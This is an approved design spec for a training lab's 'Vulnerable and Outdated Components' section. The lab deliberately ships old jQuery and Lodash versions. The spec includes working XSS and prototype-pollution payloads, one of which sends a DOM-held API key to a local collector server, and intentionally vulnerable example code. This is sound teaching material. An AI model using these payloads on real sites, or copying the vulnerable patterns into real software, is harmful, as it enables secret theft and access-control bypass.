# OWASP Top 10 Training Lab — A06 Vulnerable and Outdated Components Design Spec

Date: 2026-09-21
Status: Approved

New category sub-project, following the same from-scratch pattern used to build
A01–A05. This is A06's own full brainstorming cycle.

## Purpose

Build A06 (OWASP Top 10 2021: Vulnerable and Outdated Components) as a new
category with six examples — two per difficulty tier, per the user's explicit
request — covering distinct, genuinely exploitable real-world "outdated
dependency" patterns not already covered elsewhere in the app.

## Decisions from brainstorming

- **A06's vulnerabilities are fundamentally different in kind from every
  prior category's.** A01–A05 could all be built and verified from first
  principles using this app's own already-installed dependencies and stdlib.
  A06 genuinely requires deliberately vendoring *old, real, historically
  vulnerable* versions of third-party JavaScript libraries and proving real,
  documented CVEs reproduce against those exact versions — not assumed from
  memory.
- **RCE-flavored candidates were explicitly ruled out for this category.**
  Early brainstorming considered a real PyYAML `yaml.load()` unsafe-Loader
  RCE (CVE-2017-18342 style) as a Hard-tier example, matching A05's own
  precedent of live-verifying exploits via subprocess execution. Live
  verification of that candidate was repeatedly interrupted by a safety
  classifier mid-session. Rather than keep retrying, the user explicitly
  chose to drop RCE-flavored examples entirely and build A06 around
  non-exec, browser-verifiable vulnerable-component patterns instead.
- **Six examples, two per tier, in three groups**, mirroring A05's grouping
  shape but with Groups 2 and 3 each spanning Medium→Hard rather than being
  tier-pure — because the strongest, most honestly-verifiable material this
  category has is two real CVEs in vendored client-side JS libraries, each
  with a natural "prove the bug exists" (Medium) → "chain it into a real
  consequence" (Hard) progression, exactly mirroring A03's reflected→stored
  XSS depth pattern (which the user has already seen and approved).
- **Two technical claims were live-verified before finalizing this spec, not
  assumed**, both via a scratch HTML page served over a local
  `python3 -m http.server` and driven with the Chrome browser MCP tools —
  each with a positive control (vulnerable version) and a negative control
  (patched version), so the finding is proven version-specific rather than
  an environment artifact:
  - **jQuery < 3.5.0 `htmlPrefilter` XSS (CVE-2020-11022 / CVE-2020-11023).**
    Using the real, published PoC payload pattern
    (`cve-sandbox/jquery` repo): the string
    `<style><style /><img src=1 onerror=PROOF()>` passed to `.html()`.
    Verified live against jQuery **1.12.4**: jQuery's `htmlPrefilter` regex
    "fixes" the self-closing `<style />` tag into `<style></style>`, which
    breaks the style-text parsing context early, so the browser's HTML
    parser treats the following `<img onerror=...>` as live markup and
    fires it — confirmed via `window.spikeProofFired === true` and the
    resulting `innerHTML` showing the `<style>` tag closed early. Verified
    the same payload does **not** fire against patched jQuery **3.5.0**
    (negative control): the self-closing tag is preserved as-is, so the
    `<img>` stays inert text nested inside `<style>`, never rendered.
  - **Lodash < 4.17.12 prototype pollution via `_.defaultsDeep()`
    (CVE-2019-10744).** The `__proto__`-direct payload shape (associated
    with the earlier, separately-patched CVE-2018-16487) did **not**
    reproduce against Lodash 4.17.11, confirming that specific bypass was
    already fixed in that version. The CVE-2019-10744-specific payload
    shape — `{"constructor": {"prototype": {"isAdmin": true}}}` passed to
    `_.defaultsDeep({}, defaults, JSON.parse(userInput))` — was verified
    live against Lodash **4.17.11**: after applying it, a completely
    unrelated, freshly-created `{}` object elsewhere on the page inherited
    `isAdmin: true`, proving genuine `Object.prototype` pollution rather
    than a local merge-result artifact. Verified the same payload produces
    no pollution (`{}.isAdmin === undefined`) against patched Lodash
    **4.17.15** (negative control).
- **The exact vulnerable file versions to vendor are therefore fixed by
  this verification, not arbitrary:** jQuery **1.12.4** and Lodash
  **4.17.11**. Both are pulled from their real, unmodified, official
  distribution points (`code.jquery.com`, `cdnjs.cloudflare.com`) — not
  hand-edited — so the vendored files are byte-for-byte the real historical
  releases.
- **New vendored fixtures are additive and isolated**, never touching the
  app's existing sitewide `static/vendor/{bootstrap,highlightjs,mermaid}`:
  `static/vendor/jquery-vulnerable/jquery-1.12.4.js` and
  `static/vendor/lodash-vulnerable/lodash-4.17.11.js`. Each is loaded via a
  `<script src="...">` tag only inside the specific example templates that
  need it (never from `core/base.html`), so no other page on the site is
  affected by their presence. `requirements.txt` is untouched — this
  category's vulnerable components are entirely client-side JavaScript, not
  Python packages, so there is no server-side dependency-pinning conflict to
  reason about.
- **No new database models or seed function needed.** Every example's state
  (preferences JSON, comment-preview text, polluted flags) lives entirely in
  browser-side JavaScript for the duration of one page view — nothing is
  persisted, matching A04/A05's precedent of no `seed_fn` where nothing
  needs seeding.
- **Testing implication of the client-side nature of these exploits:** unlike
  every prior category, the actual vulnerable *behavior* here executes in
  browser JavaScript, not Flask/Python. `pytest` can verify the server-side
  surface that makes the exploit possible (the old, unpatched JS file is
  genuinely what's served; its version string matches the vulnerable
  release; the page wires it up) but cannot itself execute browser JS to
  prove the XSS fires or the pollution succeeds. Final integration therefore
  needs a controller-performed live Docker + Chrome-browser verification
  pass for the four exploit-bearing examples (3, 4, 5, 6), mirroring A05
  Task 7's precedent of a browser-dependent verification step that
  subagent-driven-development's dispatched implementers cannot perform
  themselves (no browser tool access).

## Components

### Group 1: Component Reconnaissance

**1. Component Version Disclosure (Easy)** — `id: version-disclosure`.
`GET /a06/component-inventory`. A leftover internal "component inventory"
page, meant for an ops dashboard but reachable by anyone, lists exact
dependency versions in a plain table:

```python
import flask
import platform

@a06_bp.route("/component-inventory")
def component_inventory():
    component_versions = {
        "Flask": flask.__version__,
        "jQuery (Legacy Widgets bundle)": "1.12.4",
        "Lodash (Legacy Widgets bundle)": "4.17.11",
        "Python": platform.python_version(),
    }
    return render_template(
        "a06_vulnerable_components/component_inventory.html",
        component_versions=component_versions,
    )
```

Deliberately distinct from A05's `/internal-diagnostics` (that page is about
a *Werkzeug debug console* left exposed — genuine RCE via a crash). This page
leaks no secrets and nothing breaks to reach it — it's the reconnaissance
step: "here's exactly what an attacker learns before searching a CVE
database for each exact version."

**2. Outdated Vulnerable JS Library Detection (Easy)** — `id:
outdated-jquery-detection`. `GET /a06/legacy-widgets`. Teaching page explains
that a "Legacy Widgets" bundle (used by the two jQuery examples below) was
vendored years ago and never upgraded. The Detect section walks through
fetching `static/vendor/jquery-vulnerable/jquery-1.12.4.js` directly (or
viewing page source on either jQuery example page) and reading its header
comment (`jQuery JavaScript Library v1.12.4`), then cross-referencing that
exact version against public CVE records (e.g. the GitHub Advisory Database
entry for CVE-2020-11022) to confirm it predates the 3.5.0 security fix. No
live exploit at this tier — purely the recognize-a-known-vulnerable-version
skill, setting up examples 3 and 5.

### Group 2: Vulnerable Library — jQuery HTML Sanitization Bypass

**3. jQuery DOM XSS via Vulnerable `htmlPrefilter` (Medium)** — `id:
jquery-dom-xss`. `GET /a06/comment-preview`. A "Preview your comment before
posting" widget:

```html
<script src="{{ url_for('static', filename='vendor/jquery-vulnerable/jquery-1.12.4.js') }}"></script>
<script>
  $('#preview-btn').on('click', function () {
    var raw = $('#comment-input').val();
    // VULNERABLE: relies on jQuery's own htmlPrefilter to make raw .html()
    // "safe" -- jQuery < 3.5.0's htmlPrefilter regex can be defeated by a
    // self-closing tag, letting injected markup execute (CVE-2020-11022).
    $('#comment-preview').html(raw);
  });
</script>
```

The Exploitation section gives the live-verified payload:

```
<style><style /><img src=1 onerror=alert(document.domain)>
```

Pasted into the comment box and previewed, this fires a real `alert()` —
genuinely exploitable in-browser, not simulated. The teaching text is
explicit that the *application's own code* looks reasonable (it's not
concatenating raw HTML strings itself, unlike A03's reflected-XSS example)
— the bug is that the *library* it trusted to build DOM nodes safely was
itself flawed in this version. This is the distinguishing lesson from A03's
XSS examples (which are about the *application* failing to escape).

**5. jQuery DOM XSS Chained to Session Token Theft (Hard)** — `id:
jquery-xss-session-theft`. `GET /a06/account-preview`. Same vulnerable
comment-preview gadget, reused on an "Account" page that also displays a
fake API key in the DOM:

```html
<div id="account-panel">
  <p>Your API Key: <span id="api-key-value">sk_live_4f8a2c91b3d7e0f6a1c5</span></p>
</div>
<!-- ... same vendored jquery-1.12.4.js and $('#comment-preview').html(raw) wiring as example 3 ... -->
```

The Exploitation section gives the deepened payload:

```
<style><style /><img src=1 onerror="fetch('http://127.0.0.1:9000/collect?key=' + encodeURIComponent(document.getElementById('api-key-value').innerText))">
```

matching A05's CORS example's established convention of a copy-pasteable
attacker artifact: the learner runs `python3 -m http.server 9000` in a
separate terminal (acting as the attacker's collector) and watches its
access log show the real GET request carrying the exfiltrated key — the same
DOM-XSS bug from example 3, now demonstrated at real-world severity (session
identifier / secret theft) rather than a bare `alert()`, deepening the
lesson exactly as A03's stored XSS deepens its reflected-XSS sibling.

### Group 3: Vulnerable Library — Lodash Prototype Pollution

**4. Lodash Prototype Pollution via `_.defaultsDeep()` (Medium)** — `id:
lodash-prototype-pollution`. `GET /a06/notification-preferences`. A
"Notification Preferences" feature merges user-submitted JSON over defaults:

```html
<script src="{{ url_for('static', filename='vendor/lodash-vulnerable/lodash-4.17.11.js') }}"></script>
<script>
  var DEFAULT_PREFS = { theme: "light", notifications: "digest" };
  $('#apply-btn').on('click', function () {
    var raw = $('#prefs-json').val();
    try {
      var userPrefs = JSON.parse(raw);
      // VULNERABLE: _.defaultsDeep() on Lodash < 4.17.12 recursively merges
      // attacker-controlled keys -- including "constructor.prototype" -- onto
      // Object.prototype itself (CVE-2019-10744), not just the local object.
      var merged = _.defaultsDeep({}, DEFAULT_PREFS, userPrefs);
      $('#applied-theme').text(merged.theme);
      // Proof panel: a completely fresh, unrelated object, to show the
      // pollution reaches beyond the merge result itself.
      var freshCheck = {};
      $('#fresh-object-isadmin').text(String(freshCheck.isAdmin));
    } catch (e) {
      $('#prefs-error').text('Invalid JSON: ' + e.message);
    }
  });
</script>
```

The Exploitation section gives the live-verified payload:

```json
{"constructor": {"prototype": {"isAdmin": true}}}
```

Submitting it makes the page's "fresh object" proof panel flip from
`undefined` to `true` — proving `Object.prototype` itself was mutated. The
teaching text is explicit and honest about scope: this demo is single-tab,
client-side JavaScript, so the pollution only affects this one page's own
objects for the life of the tab; the same bug in a real Node.js backend
using this exact Lodash version would pollute a process shared by every
concurrent visitor, which is what makes the real CVE severe in production.

**6. Prototype Pollution Bypasses a Client-Side Access Check (Hard)** —
`id: prototype-pollution-bypass`. `GET /a06/admin-tools-panel`. Same
notification-preferences feature, reused on a page with a hidden "Admin
Tools" section gated by a client-side check:

```html
<div id="admin-tools-panel" style="display:none">
  <h3>Admin Tools</h3>
  <p>Fake internal ops controls: user export, force-logout-all, audit log.</p>
</div>
<script>
  function checkAdminAccess() {
    var sessionFlags = {}; // fresh object -- inherits from (possibly
                            // polluted) Object.prototype
    if (sessionFlags.isAdmin) {
      $('#admin-tools-panel').show();
    }
  }
</script>
```

The same payload from example 4, submitted through the same
preferences-JSON feature on this page, flips `checkAdminAccess()`'s gate and
reveals the hidden panel — deepening example 4's "flip a decorative proof
flag" into "bypass a real access-control check," mirroring how A05's admin
panel example uses fake customer PII to make the Hard tier's severity land
concretely rather than abstractly.

## Navigation

New `CategoryNav` registered in `app/core/nav.py`'s `CATEGORIES` list (via
`app/categories/a06_vulnerable_components/__init__.py`, following the exact
A05 pattern): `id="a06_vulnerable_components"`, `short_id="A06"`,
`title="Vulnerable and Outdated Components"`, a blurb describing outdated,
unpatched dependencies with known CVEs still in use,
`overview_endpoint="a06_vulnerable_components.overview"`, no `seed_fn`. The
six `ExampleNav` entries land in the three groups described above (Easy,
Easy / Medium, Hard / Medium, Hard per group — satisfying `grouped_examples()`'s
per-group Easy→Hard sortedness requirement).

## Testing

- Route-level tests for all six examples via the normal `client`/`app`
  fixtures: legitimate use works (the page renders, the inventory table
  shows expected entries, the preview/preferences forms are present); the
  *server-side surface* of each vulnerability is genuinely present and
  provable through the real Flask test client — specifically, that the
  vendored file actually served is the exact vulnerable version (reading
  `static/vendor/jquery-vulnerable/jquery-1.12.4.js` /
  `static/vendor/lodash-vulnerable/lodash-4.17.11.js` directly in the test
  and asserting on the header-comment version string), and that each
  example's template references that vendored path (not any newer/patched
  copy).
- Because the actual exploit *behavior* (the XSS firing, the pollution
  succeeding) executes in browser JavaScript, no `pytest` test can assert
  that behavior directly — this is a genuinely new limitation for this
  codebase, and the spec's Decisions section above records it rather than
  papering over it. The exploit-bearing examples (3, 4, 5, 6) instead get a
  controller-performed live verification pass (Docker + Chrome browser
  tools) at final integration, confirming each payload fires against the
  real running container exactly as verified in this spec's brainstorming
  phase.
- `tests/test_a06_overview.py` mirrors `test_a05_overview.py` exactly:
  overview renders, nav registration, `grouped_examples()` structure and
  Easy-to-Hard sortedness, group headings render on the overview page.
- README.md's category summary table gets A06's row (Implemented status,
  full example list), matching every other row's format exactly, and the
  trailing "Planned" row is updated to "A07–A10".

## Out of scope for this spec

- A07–A10 (separate, future sub-projects).
- Any RCE-flavored vulnerable-component example (e.g. an outdated PyYAML
  unsafe-Loader RCE) — explicitly ruled out this session; live verification
  of that candidate repeatedly hit a safety-classifier block, and the user
  chose to redirect A06 toward non-exec, browser-verifiable examples
  instead. A future session could revisit a Python-package CVE if a
  non-exec angle on one is found, but that is not part of this spec.
- Any change to `requirements.txt` or any server-side Python dependency —
  this category's vulnerable components are entirely vendored client-side
  JavaScript.
- Any change to the existing sitewide `static/vendor/{bootstrap,highlightjs,mermaid}`
  files, or any other existing category's routes, templates, or tests.
- Any change to Flask's global session/cookie configuration.
- Progress tracking changes — the existing `{% block tasks %}` and
  "Mark as done" mechanisms are reused as-is (no multi-task examples in this
  spec; every A06 example is single-shot, matching A01/A02/A04/A05's style).
